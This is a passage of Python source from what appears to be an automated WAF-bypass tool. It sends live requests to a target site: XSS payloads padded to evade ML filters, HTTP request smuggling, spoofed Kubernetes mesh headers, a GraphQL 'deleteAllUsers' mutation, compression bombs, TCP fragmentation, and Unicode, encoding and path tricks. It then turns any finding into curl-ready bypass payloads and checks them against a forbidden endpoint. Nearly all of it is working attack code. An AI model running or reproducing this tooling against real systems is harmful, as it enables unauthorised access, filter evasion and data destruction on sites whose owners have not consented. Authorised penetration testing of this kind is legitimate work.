                    discrepancy = {
                        'type': 'QUIC/HTTP3',
                        'subtype': 'Alt-Svc Manipulation',
                        'description': 'Alt-Svc headers accepted and may affect routing',
                        'headers': headers
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "QUIC", "Alt-Svc manipulation possible")
            except:
                pass

    def test_ml_waf_evasion(self):
        """Test ML-based WAF evasion techniques"""
        print("  🤖 Testing ML WAF Evasion...")
        
        # Adversarial Padding
        try:
            benign_tokens = ['user', 'login', 'welcome', 'dashboard', 'profile']
            padding = ' '.join(random.choices(benign_tokens, k=100))
            
            payload = f"{padding} <script>alert(1)</script> {padding}"
            
            response = self.session.get(
                f"{self.target_url}/?q={urllib.parse.quote(payload)}",
                timeout=5
            )
            
            if response.status_code not in [403, 406]:
                discrepancy = {
                    'type': 'ML WAF Evasion',
                    'subtype': 'Adversarial Padding',
                    'description': 'Benign token padding may confuse ML models',
                    'padding_size': len(padding),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "ML Evasion", "Adversarial padding effective")
        except:
            pass
        
        # Context Window Overflow
        try:
            # Create payload that exceeds typical context windows
            pre_context = 'safe content ' * 200  # ~2400 chars
            malicious = '<img src=x onerror=alert(1)>'
            post_context = ' safe content' * 200
            
            full_payload = pre_context + malicious + post_context
            
            response = self.session.post(
                self.target_url,
                data={'content': full_payload},
                timeout=5
            )
            
            if response.status_code not in [403, 406]:
                discrepancy = {
                    'type': 'ML WAF Evasion',
                    'subtype': 'Context Window Overflow',
                    'description': 'Large context may exceed ML model window',
                    'payload_size': len(full_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "ML Evasion", "Context window overflow")
        except:
            pass

    def test_container_orchestration_bypass(self):
        """Test container/orchestration layer bypasses"""
        print("  🐳 Testing Container Orchestration Bypass...")
        
        # Service Mesh Headers
        try:
            # Use discovered forbidden endpoint if available
            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            parsed_endpoint = urlparse(test_endpoint)
            test_path = parsed_endpoint.path or '/admin'
            
            k8s_headers = {
                'X-Forwarded-Host': 'admin-service.default.svc.cluster.local',
                'X-Envoy-Decorator-Operation': 'admin-service.admin.svc.cluster.local/*',
                'X-B3-TraceId': ''.join(random.choices('0123456789abcdef', k=32)),
                'X-B3-SpanId': ''.join(random.choices('0123456789abcdef', k=16))
            }
            
            response = self.session.get(
                test_endpoint,
                headers=k8s_headers,
                timeout=5
            )
            
            if response.status_code == 200:
                discrepancy = {
                    'type': 'Container Orchestration',
                    'subtype': 'Service Mesh Headers',
                    'description': 'K8s service mesh headers affect routing',
                    'headers': k8s_headers,
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "K8s", "Service mesh header bypass")
        except:
            pass

    def test_graphql_rest_confusion(self):
        """Test GraphQL-REST gateway confusion"""
        print("  📊 Testing GraphQL-REST Gateway Confusion...")
        
        try:
            # REST to GraphQL Injection
            graphql_in_rest = {
                'path': '/api/users/1;query{admin{password}}',
                'headers': {'Content-Type': 'application/json'}
            }
            
            response = self.session.get(
                f"{self.target_url}{graphql_in_rest['path']}",
                headers=graphql_in_rest['headers'],
                timeout=5
            )
            
            if 'admin' in response.text or 'graphql' in response.text.lower():
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'REST to GraphQL Injection',
                    'description': 'GraphQL query in REST endpoint',
                    'injection_point': 'URL path parameter',
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "REST-GraphQL boundary confusion")
        except:
            pass
        
        # GraphQL Batching via REST
        try:
            batch_payload = {
                'query': [
                    'query { user { name } }',
                    'mutation { deleteAllUsers }'
                ]
            }
            
            response = self.session.post(
                f"{self.target_url}/graphql",
                json=batch_payload,
                timeout=5
            )
            
            if response.status_code == 200:
                discrepancy = {
                    'type': 'GraphQL-REST Confusion',
                    'subtype': 'Batch Query Injection',
                    'description': 'GraphQL batching accepted via REST',
                    'technique': 'Array of queries'
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "GraphQL", "Batch queries accepted")
        except:
            pass

    def test_tcp_fragmentation(self):
        """Test TCP fragmentation bypass techniques"""
        print("  🌊 Testing TCP Fragmentation Bypass...")
        
        try:
            # Create a raw socket connection for fragmentation testing
            import socket
            
            # Test payload split across TCP segments
            target_host = self.parsed_url.hostname
            target_port = 443 if self.parsed_url.scheme == 'https' else 80
            
            # Create fragmented HTTP request
            request_part1 = b"GET /adm"
            request_part2 = b"in HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n"
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.parsed_url.scheme == 'https':
                import ssl
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target_host)
            
            sock.connect((target_host, target_port))
            
            # Send fragmented request
            sock.send(request_part1)
            time.sleep(0.01)  # Small delay to ensure separate TCP segments
            sock.send(request_part2)
            
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            sock.close()
            
            # Check if fragmentation affected processing
            if "200 OK" in response or "admin" in response.lower():
                discrepancy = {
                    'type': 'TCP Fragmentation',
                    'description': 'TCP fragmentation may bypass WAF inspection',
                    'evidence': 'Fragmented request processed differently',
                    'payload': {'part1': request_part1, 'part2': request_part2}
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "TCP Fragmentation", "Potential fragmentation bypass")
                
        except Exception as e:
            # Fallback to application-level testing
            self.log_discovery("TCP Fragmentation", "Info", "Raw socket test failed, using application-level test")

    def test_compression_bomb(self):
        """Test compression bomb bypass technique"""
        print("  💣 Testing Compression Bomb Bypass...")
        
        try:
            # Create a payload that's small compressed but large uncompressed
            large_payload = "A" * 10000  # 10KB uncompressed
            
            # Compress the payload
            compressed_payload = gzip.compress(large_payload.encode())
            
            # Test if WAF processes compressed vs uncompressed differently
            headers = {
                'Content-Encoding': 'gzip',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(compressed_payload))
            }
            
            response = self.session.post(
                self.target_url,
                data=compressed_payload,
                headers=headers,
                timeout=10
            )
            
            # Check for processing differences
            if response.status_code in [200, 413, 414, 502]:
                discrepancy = {
                    'type': 'Compression Bypass',
                    'description': 'Compression may affect WAF inspection',
                    'compressed_size': len(compressed_payload),
                    'uncompressed_size': len(large_payload),
                    'ratio': len(large_payload) / len(compressed_payload),
                    'response_code': response.status_code
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Compression", f"Compression ratio: {discrepancy['ratio']:.1f}x")
                
        except Exception as e:
            pass

    def test_timing_race_conditions(self):
        """Test timing-based parser race conditions"""
        print("  ⏱️ Testing Timing Race Conditions...")
        
        try:
            # Test concurrent requests with timing variations
            import threading
            import queue
            
            results = queue.Queue()
            
            def send_delayed_request(delay, request_data):
                time.sleep(delay)
                try:
                    response = self.session.post(self.target_url, data=request_data, timeout=5)
                    results.put(('success', response.status_code, delay))
                except Exception as e:
                    results.put(('error', str(e), delay))
            
            # Test with different timing delays
            test_data = "param=value&admin=true"
            delays = [0, 0.001, 0.01, 0.1]  # Different micro-timing
            
            threads = []
            for delay in delays:
                thread = threading.Thread(target=send_delayed_request, args=(delay, test_data))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads
            for thread in threads:
                thread.join()
            
            # Analyze timing results
            timing_results = []
            while not results.empty():
                timing_results.append(results.get())
            
            # Check for timing-dependent differences
            status_codes = [r[1] for r in timing_results if r[0] == 'success']
            if len(set(status_codes)) > 1:
                discrepancy = {
                    'type': 'Timing Race Condition',
                    'description': 'Timing affects request processing',
                    'timing_results': timing_results,
                    'unique_responses': len(set(status_codes))
                }
                self.chain_map['discrepancies'].append(discrepancy)
                self.log_discovery("Discrepancy", "Timing Race", f"Timing-dependent responses: {len(set(status_codes))}")
                
        except Exception as e:
            pass

    def test_http_smuggling(self):
        """Test for HTTP request smuggling vulnerabilities"""
        print("  🔀 Testing HTTP Request Smuggling...")
        
        smuggling_payloads = [
            # CL-TE discrepancy
            {
                'headers': {
                    'Content-Length': '13',
                    'Transfer-Encoding': 'chunked'
                },
                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
            },
            # TE-CL discrepancy
            {
                'headers': {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0'
                },
                'data': '1\r\nZ\r\n0\r\n\r\n'
            }
        ]
        
        for i, payload in enumerate(smuggling_payloads):
            try:
                marker = self.generate_unique_markers()['uuid']
                
                # Send smuggling attempt
                response = self.session.post(
                    self.target_url,
                    headers=payload['headers'],
                    data=payload['data'].replace('internal', marker),
                    timeout=5
                )
                
                # Look for signs of successful smuggling
                if marker in response.text or response.status_code in [400, 413, 414]:
                    discrepancy = {
                        'type': 'HTTP Smuggling',
                        'test_id': f'smuggling_{i}',
                        'payload': payload,
                        'response_code': response.status_code,
                        'evidence': marker in response.text
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "HTTP Smuggling", f"Potential smuggling in test {i}")
                    
            except Exception as e:
                continue

    def test_unicode_confusion(self):
        """Test Unicode normalization discrepancies"""
        print("  🧬 Testing Unicode Confusion...")
        
        unicode_tests = [
            # Normalization form differences
            {
                'original': '/admin',
                'nfc': '/admin',  # NFC normalization
                'nfd': '/\u0061\u0300\u0064\u006D\u0069\u006E',  # NFD with combining chars
                'confusables': '/αdmin',  # Unicode confusables (α vs a)
            },
            # Zero-width character injection
            {
                'original': '/admin',
                'zwsp': '/ad\u200Bmin',  # Zero-width space
                'zwnj': '/ad\u200Cmin',  # Zero-width non-joiner
                'zwj': '/ad\u200Dmin',   # Zero-width joiner
            }
        ]
        
        for test_group in unicode_tests:
            original = test_group['original']
            
            for variant_name, variant_path in test_group.items():
                if variant_name == 'original':
                    continue
                    
                try:
                    # Test original path
                    resp_original = self.session.get(f"{self.target_url}{original}")
                    
                    # Test variant path  
                    resp_variant = self.session.get(f"{self.target_url}{variant_path}")
                    
                    # Compare responses
                    if resp_original.status_code != resp_variant.status_code:
                        discrepancy = {
                            'type': 'Unicode Confusion',
                            'variant': variant_name,
                            'original_path': original,
                            'variant_path': variant_path,
                            'original_code': resp_original.status_code,
                            'variant_code': resp_variant.status_code
                        }
                        self.chain_map['discrepancies'].append(discrepancy)
                        self.log_discovery("Discrepancy", "Unicode", f"{variant_name}: {resp_original.status_code} vs {resp_variant.status_code}")
                        
                except Exception as e:
                    continue

    def test_encoding_discrepancies(self):
        """Test multi-layer encoding discrepancies"""
        print("  🔢 Testing Encoding Discrepancies...")
        
        test_path = "/admin"
        
        encoding_chains = [
            # URL encoding chains
            {
                'name': 'Double URL Encoding',
                'path': urllib.parse.quote(urllib.parse.quote(test_path)),
            },
            # HTML entity encoding
            {
                'name': 'HTML Entity Encoding',
                'path': ''.join(f'&#{ord(c)};' for c in test_path),
            },
            # Mixed encoding
            {
                'name': 'Mixed Encoding',
                'path': test_path.replace('a', '%61').replace('d', '&#100;'),
            },
            # Base64 in parameter
            {
                'name': 'Base64 Parameter',
                'path': f"/?path={base64.b64encode(test_path.encode()).decode()}",
            }
        ]
        
        # Get baseline response
        try:
            baseline = self.session.get(f"{self.target_url}{test_path}")
        except:
            return
        
        for encoding in encoding_chains:
            try:
                response = self.session.get(f"{self.target_url}{encoding['path']}")
                
                # Compare with baseline
                if response.status_code != baseline.status_code:
                    discrepancy = {
                        'type': 'Encoding Discrepancy',
                        'encoding_name': encoding['name'],
                        'encoded_path': encoding['path'],
                        'baseline_code': baseline.status_code,
                        'encoded_code': response.status_code
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Encoding", f"{encoding['name']}: {baseline.status_code} vs {response.status_code}")
                    
            except Exception as e:
                continue

    def test_header_confusion(self):
        """Test header parsing discrepancies"""
        print("  📋 Testing Header Confusion...")
        
        header_tests = [
            # Host header confusion
            {
                'name': 'Host Header Injection',
                'headers': {
                    'Host': 'evil.com',
                    'X-Host': self.parsed_url.netloc,
                }
            },
            # Method override
            {
                'name': 'Method Override',
                'headers': {
                    'X-HTTP-Method-Override': 'DELETE',
                    'X-HTTP-Method': 'PUT',
                    'X-Method-Override': 'PATCH'
                }
            },
            # Content-Type confusion
            {
                'name': 'Content-Type Confusion',
                'headers': {
                    'Content-Type': 'application/json',
                    'X-Content-Type': 'application/x-www-form-urlencoded'
                }
            }
        ]
        
        for test in header_tests:
            try:
                response = self.session.get(self.target_url, headers=test['headers'])
                
                # Look for unusual responses that might indicate processing differences
                if response.status_code in [400, 405, 413, 414, 502, 503]:
                    discrepancy = {
                        'type': 'Header Confusion',
                        'test_name': test['name'],
                        'headers': test['headers'],
                        'response_code': response.status_code,
                        'response_headers': dict(response.headers)
                    }
                    self.chain_map['discrepancies'].append(discrepancy)
                    self.log_discovery("Discrepancy", "Header", f"{test['name']}: {response.status_code}")
                    
            except Exception as e:
                continue

    def test_method_confusion(self):
        """Test HTTP method handling discrepancies"""
        print("  🔄 Testing Method Confusion...")
        
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']
        results = {}
        
        for method in methods:
            try:
                response = self.session.request(method, self.target_url, timeout=5)
                results[method] = response.status_code
            except Exception as e:
                results[method] = f"Error: {str(e)}"
        
        # Look for inconsistencies
        unique_responses = set(results.values())
        if len(unique_responses) > 2:  # More than just 200 and 405
            discrepancy = {
                'type': 'Method Confusion',
                'method_responses': results,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Methods", f"Inconsistent method handling: {len(unique_responses)} different responses")

    def test_path_normalization(self):
        """Test path normalization discrepancies"""
        print("  📁 Testing Path Normalization...")
        
        base_path = "/admin"
        path_variants = [
            "/admin",
            "/admin/",
            "/admin//",
            "/admin/.",
            "/admin/../admin",
            "/./admin",
            "//admin",
            "/admin/./",
            "/admin/../",
            "/admin%2f",
            "/admin%2F",
            "/admin%5c",
            "/admin%5C"
        ]
        
        responses = {}
        for path in path_variants:
            try:
                response = self.session.get(f"{self.target_url}{path}")
                responses[path] = response.status_code
            except Exception as e:
                responses[path] = f"Error: {str(e)}"
        
        # Look for discrepancies
        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Path Normalization',
                'path_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Path Normalization", f"Inconsistent path handling: {len(unique_responses)} different responses")

    def test_parameter_pollution(self):
        """Test parameter pollution discrepancies"""
        print("  🔀 Testing Parameter Pollution...")
        
        pollution_tests = [
            "?param=value1&param=value2",
            "?param=value1&PARAM=value2",
            "?param[]=value1&param[]=value2",
            "?param=value1&param%5b%5d=value2"
        ]
        
        responses = {}
        for test in pollution_tests:
            try:
                response = self.session.get(f"{self.target_url}{test}")
                responses[test] = response.status_code
            except Exception as e:
                responses[test] = f"Error: {str(e)}"
        
        # Check for discrepancies
        unique_responses = set(responses.values())
        if len(unique_responses) > 1:
            discrepancy = {
                'type': 'Parameter Pollution',
                'pollution_responses': responses,
                'unique_responses': len(unique_responses)
            }
            self.chain_map['discrepancies'].append(discrepancy)
            self.log_discovery("Discrepancy", "Parameter Pollution", f"Inconsistent parameter handling: {len(unique_responses)} different responses")

    def generate_custom_bypasses(self):
        """Generate custom bypass payloads based on discovered discrepancies"""
        print("\n🔍 Phase 4: Custom Bypass Generation")
        
        if not self.chain_map['discrepancies']:
            print("  ℹ️ No discrepancies found - generating generic bypasses")
            self.generate_generic_bypasses()
            return
        
        for discrepancy in self.chain_map['discrepancies']:
            bypass_payload = self.create_bypass_from_discrepancy(discrepancy)
            if bypass_payload:
                self.chain_map['bypasses'].append(bypass_payload)
                self.log_discovery("Bypass", discrepancy['type'], f"Generated custom bypass")

    def create_bypass_from_discrepancy(self, discrepancy):
        """Create a specific bypass payload from a discovered discrepancy"""
        
        try:
            if discrepancy['type'] == 'HTTP Smuggling':
                return {
                    'type': 'HTTP Smuggling Bypass',
                    'payload': discrepancy['payload'],
                    'target': 'HTTP Request Smuggling',
                    'description': f"Exploits {discrepancy['test_id']} smuggling discrepancy",
                    'test_instructions': 'Send malformed requests to bypass WAF and reach backend',
                    'curl_data': {
                        'method': 'POST',
                        'headers': discrepancy['payload']['headers'],
                        'data': discrepancy['payload']['data']
                    }
                }
            
            elif discrepancy['type'] == 'TCP Fragmentation':
                return {
                    'type': 'TCP Fragmentation Bypass',
                    'payload': discrepancy['payload'],
                    'target': 'WAF TCP inspection',
                    'description': 'Fragments TCP packets to bypass deep packet inspection',
                    'implementation': 'Use raw sockets to control TCP segmentation',
                    'curl_data': {
                        'method': 'RAW_SOCKET',
                        'note': 'Cannot be implemented with curl - requires raw socket programming'
                    }
                }
            
            elif discrepancy['type'] == 'Compression Bypass':
                return {
                    'type': 'Compression Bomb Bypass',
                    'payload': f"Compression ratio: {discrepancy['ratio']:.1f}x",
                    'target': 'WAF payload size limits',
                    'description': f"Small compressed payload ({discrepancy['compressed_size']} bytes) expands to {discrepancy['uncompressed_size']} bytes",
                    'implementation': 'Use gzip compression with high expansion ratio',
                    'curl_data': {
                        'method': 'POST',
                        'headers': {'Content-Encoding': 'gzip'},
                        'data_file': 'compressed_payload.gz',
                        'note': 'Create gzip file with large repeated content'
                    }
                }
            
            elif discrepancy['type'] == 'Timing Race Condition':
                return {
                    'type': 'Timing Race Bypass',
                    'payload': 'Concurrent requests with micro-timing',
                    'target': 'Parser state machine',
                    'description': f"Timing variations produce {discrepancy['unique_responses']} different responses",
                    'implementation': 'Send requests with precise timing delays',
                    'curl_data': {
                        'method': 'PARALLEL',
                        'commands': [
                            'curl -X POST $URL -d "param=value&admin=true" &',
                            'sleep 0.001 && curl -X POST $URL -d "param=value&admin=true" &',
                            'sleep 0.01 && curl -X POST $URL -d "param=value&admin=true" &'
                        ]
                    }
                }
            
            elif discrepancy['type'] == 'Unicode Confusion':
                return {
                    'type': 'Unicode Bypass',
                    'payload': discrepancy['variant_path'],
                    'target': 'WAF Unicode normalization',
                    'description': f"Uses {discrepancy['variant']} to bypass filters",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy['variant_path']
                    }
                }
            
            elif discrepancy['type'] == 'Encoding Discrepancy':
                return {
                    'type': 'Encoding Bypass',
                    'payload': discrepancy['encoded_path'],
                    'target': f"{discrepancy['encoding_name']} confusion",
                    'description': f"Exploits encoding differences between layers",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy['encoded_path']
                    }
                }
            
            elif discrepancy['type'] == 'Header Confusion':
                return {
                    'type': 'Header Bypass',
                    'payload': discrepancy['headers'],
                    'target': 'Header parsing differences',
                    'description': f"Exploits {discrepancy['test_name']} confusion",
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy['headers']
                    }
                }
            
            elif discrepancy['type'] == 'Path Normalization':
                # Find the most different response
                responses = discrepancy['path_responses']
                most_different = min(responses.items(), key=lambda x: x[1] if isinstance(x[1], int) else 999)
                return {
                    'type': 'Path Bypass',
                    'payload': most_different[0],
                    'target': 'Path normalization differences',
                    'description': f"Exploits path handling inconsistencies",
                    'curl_data': {
                        'method': 'GET',
                        'path': most_different[0]
                    }
                }
            
            elif discrepancy['type'] == 'Parameter Pollution':
                return {
                    'type': 'Parameter Pollution Bypass',
                    'payload': 'Multiple parameter values',
                    'target': 'Parameter parsing differences',
                    'description': f"Exploits inconsistent parameter handling across {discrepancy['unique_responses']} layers",
                    'curl_data': {
                        'method': 'GET',
                        'query': '?param=safe&param=admin&PARAM=test'
                    }
                }
            
            # New advanced bypass types
            elif discrepancy['type'] == 'Parser State Confusion':
                if discrepancy['subtype'] == 'H2 Pseudo-Header Injection':
                    return {
                        'type': 'H2 Pseudo-Header Bypass',
                        'payload': discrepancy['headers'],
                        'target': 'HTTP/2 to HTTP/1.1 downgrade',
                        'description': 'Exploits H2 pseudo-header acceptance in H1 context',
                        'curl_data': {
                            'method': 'GET',
                            'headers': discrepancy['headers'],
                            'note': 'Use --http2 flag if supported'
                        }
                    }
                elif discrepancy['subtype'] == 'WebSocket State Leak':
                    return {
                        'type': 'WebSocket State Bypass',
                        'payload': 'WebSocket upgrade followed by normal request',
                        'target': 'Protocol state machine',
                        'description': 'Exploits state leakage between WebSocket and HTTP',
                        'curl_data': {
                            'method': 'SEQUENCE',
                            'commands': [
                                'curl -H "Upgrade: websocket" -H "Connection: Upgrade" $URL',
                                'curl $URL/admin'
                            ]
                        }
                    }
            
            elif discrepancy['type'] == 'Buffer Boundary':
                # Handle different buffer types safely
                buffer_size = discrepancy.get('buffer_size', 0)
                return {
                    'type': 'Buffer Overflow Bypass',
                    'payload': f"{buffer_size} byte boundary",
                    'target': 'Parser buffer limits',
                    'description': f"Exploits {discrepancy.get('subtype', 'buffer limit')} at {buffer_size} bytes",
                    'curl_data': {
                        'method': 'GET',
                        'headers': {'X-Large-Header': 'A' * (buffer_size - 100) if buffer_size > 100 else 'A' * 50},
                        'note': f'Add payload after {buffer_size} byte boundary'
                    }
                }
            
            elif discrepancy['type'] == 'Nested Encoding':
                return {
                    'type': 'Multi-Encoding Bypass',
                    'payload': discrepancy.get('encoded_path', discrepancy.get('payload', 'Mixed encoding')),
                    'target': 'Encoding parser stack',
                    'description': f"Exploits {discrepancy['subtype']} encoding confusion",
                    'curl_data': {
                        'method': 'GET',
                        'path': discrepancy.get('encoded_path', '/admin'),
                        'encoding': discrepancy['subtype']
                    }
                }
            
            elif discrepancy['type'] == 'Cache Key Confusion':
                return {
                    'type': 'Cache Poisoning Bypass',
                    'payload': 'Case/parameter variations',
                    'target': 'CDN cache key generation',
                    'description': f"Exploits {discrepancy['subtype']} in cache key computation",
                    'curl_data': {
                        'method': 'GET',
                        'variations': discrepancy.get('variations', {}),
                        'note': 'Try different case/parameter order combinations'
                    }
                }
            
            elif discrepancy['type'] == 'ML WAF Evasion':
                return {
                    'type': 'ML Model Bypass',
                    'payload': discrepancy['subtype'],
                    'target': 'Machine learning WAF model',
                    'description': f"Uses {discrepancy['subtype']} to evade ML detection",
                    'curl_data': {
                        'method': 'POST' if discrepancy['subtype'] == 'Context Window Overflow' else 'GET',
                        'payload_size': discrepancy.get('payload_size', 0),
                        'technique': discrepancy['subtype']
                    }
                }
            
            elif discrepancy['type'] == 'Container Orchestration':
                return {
                    'type': 'K8s Service Mesh Bypass',
                    'payload': discrepancy['headers'],
                    'target': 'Service mesh routing',
                    'description': 'Exploits Kubernetes service mesh headers',
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy['headers'],
                        'path': '/admin'
                    }
                }
            
            elif discrepancy['type'] == 'TOCTOU Race':
                return {
                    'type': 'TOCTOU Bypass',
                    'payload': 'Race condition timing attack',
                    'target': 'Async validation logic',
                    'description': 'Exploits time-of-check vs time-of-use race condition',
                    'curl_data': {
                        'method': 'RACE',
                        'timing': discrepancy.get('timing_results', []),
                        'note': 'Requires precise timing between requests'
                    }
                }
            
            elif discrepancy['type'] == 'Protocol Tunneling':
                return {
                    'type': 'Protocol Tunneling Bypass',
                    'payload': discrepancy.get('technique', 'Protocol confusion'),
                    'target': 'Protocol parser',
                    'description': f"Exploits {discrepancy.get('subtype', 'protocol')} confusion",
                    'curl_data': {
                        'method': 'GET',
                        'headers': discrepancy.get('headers', {}),
                        'note': 'May require special protocol handling'
                    }
                }
            
            return None
        
        except Exception as e:
            print(f"  ⚠️ Error creating bypass for {discrepancy.get('type', 'unknown')}: {str(e)}")
            return None

    def generate_generic_bypasses(self):
        """Generate generic bypass techniques"""
        generic_bypasses = [
            {
                'type': 'Generic Path Traversal',
                'payload': '/./target/../',
                'target': 'Path normalization',
                'description': 'Classic path traversal technique',
                'curl_data': {
                    'method': 'GET',
                    'path': '/./admin/../admin'
                }
            },
            {
                'type': 'Generic Double Encoding',
                'payload': '%252e%252e%252f',
                'target': 'Double URL decoding',
                'description': 'Double URL encoding bypass',
                'curl_data': {
                    'method': 'GET',
                    'path': '/%252e%252e%252fadmin'
                }
            },
            {
                'type': 'Generic Unicode',
                'payload': '/αdmin',  # α looks like 'a'
                'target': 'Unicode confusables',
                'description': 'Unicode lookalike characters',
                'curl_data': {
                    'method': 'GET',
                    'path': '/αdmin'
                }
            }
        ]
        
        self.chain_map['bypasses'].extend(generic_bypasses)

    def test_generated_bypasses(self):
        """Test the generated bypass payloads"""
        print("\n🔍 Phase 5: Bypass Validation")
        
        if not self.chain_map['bypasses']:
            print("  ℹ️ No bypasses to test")
            return
        
        # Check if we have a forbidden endpoint to test against
        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
            print("  ⚠️ No forbidden endpoint available for bypass validation")
            print("  💡 Use --forbidden-endpoint to specify one for better validation")
            return
        
        for bypass in self.chain_map['bypasses']:
            success = self.validate_bypass(bypass)
            bypass['validated'] = success
            
            status = "✅" if success else "❌"
            print(f"  {status} {bypass['type']}: {bypass['description']}")

    def validate_bypass(self, bypass):
        """Validate a specific bypass technique"""
        try:
            print(f"    🔍 Testing {bypass['type']}: {bypass['description']}")
            
            # Use discovered forbidden endpoint if available
            test_url = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
            
            if bypass['type'] in ['Unicode Bypass', 'Path Bypass']:
                response = self.session.get(f"{self.target_url}{bypass['payload']}")
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'Header Bypass':
                response = self.session.get(test_url, headers=bypass['payload'])
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'Encoding Bypass':
                response = self.session.get(f"{self.target_url}{bypass['payload']}")
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            elif bypass['type'] == 'HTTP Smuggling Bypass':
                # Test HTTP smuggling by sending the malformed request
                payload = bypass['payload']
                if isinstance(payload, dict) and 'headers' in payload and 'data' in payload:
                    response = self.session.post(
                        self.target_url, 
                        headers=payload['headers'], 
                        data=payload['data'],
                        timeout=10
                    )
                    # Smuggling success indicators: unusual status codes or response patterns
                    success = response.status_code in [200, 400, 413, 414, 502] or 'smuggl' in response.text.lower()
                    print(f"      Response: {response.status_code}, Content-Length: {len(response.content)} ({'POTENTIAL' if success else 'FAILED'})")
                    return success
                else:
                    print(f"      Invalid payload format")
                    return False
            
            elif bypass['type'] == 'TCP Fragmentation Bypass':
                # Test TCP fragmentation by attempting fragmented connection
                try:
                    import socket
                    target_host = self.parsed_url.hostname
                    target_port = 443 if self.parsed_url.scheme == 'https' else 80
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if self.parsed_url.scheme == 'https':
                        import ssl
                        context = ssl.create_default_context()
                        sock = context.wrap_socket(sock, server_hostname=target_host)
                    
                    sock.connect((target_host, target_port))
                    
                    # Send fragmented HTTP request
                    sock.send(b"GET / HTTP/1.1\r\n")
                    time.sleep(0.01)
                    sock.send(f"Host: {target_host}\r\n\r\n".encode())
                    
                    response = sock.recv(1024)
                    sock.close()
                    
                    success = b"200 OK" in response or b"HTTP" in response
                    print(f"      Fragmented connection: {'SUCCESS' if success else 'FAILED'}")
                    return success
                    
                except Exception as e:
                    print(f"      Fragmentation test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Compression Bomb Bypass':
                # Test compression bomb by sending compressed payload
                try:
                    import gzip
                    test_payload = "test=admin&user=root" * 100  # Expand this
                    compressed = gzip.compress(test_payload.encode())
                    
                    headers = {
                        'Content-Encoding': 'gzip',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': str(len(compressed))
                    }
                    
                    response = self.session.post(self.target_url, data=compressed, headers=headers, timeout=10)
                    success = response.status_code in [200, 413, 414, 502]  # Any processing = potential bypass
                    ratio = len(test_payload) / len(compressed)
                    print(f"      Compression {ratio:.1f}x, Response: {response.status_code} ({'POTENTIAL' if success else 'BLOCKED'})")
                    return success
                    
                except Exception as e:
                    print(f"      Compression test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Timing Race Bypass':
                # Test timing race by sending concurrent requests
                try:
                    import threading
                    results = []
                    
                    def test_request():
                        try:
                            response = self.session.get(test_url, timeout=5)
                            results.append(response.status_code)
                        except:
                            results.append(0)
                    
                    # Send 3 concurrent requests
                    threads = []
                    for _ in range(3):
                        thread = threading.Thread(target=test_request)
                        threads.append(thread)
                        thread.start()
                    
                    for thread in threads:
                        thread.join()
                    
                    unique_results = set(results)
                    success = len(unique_results) > 1  # Different responses = timing affects processing
                    print(f"      Timing test results: {results}, Unique: {len(unique_results)} ({'SUCCESS' if success else 'CONSISTENT'})")
                    return success
                    
                except Exception as e:
                    print(f"      Timing test failed: {str(e)}")
                    return False
            
            elif bypass['type'] == 'Parameter Pollution Bypass':
                # Test parameter pollution
                test_url_pollution = f"{test_url}?param=safe&param=admin&PARAM=test"
                response = self.session.get(test_url_pollution)
                success = response.status_code not in [403, 406, 418, 429]
                print(f"      Parameter pollution: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                return success
            
            else:
                print(f"      Unknown bypass type: {bypass['type']}")
                return False
                
        except Exception as e:
            print(f"      Validation error: {str(e)}")
            return False

    def export_bypasses_json(self):
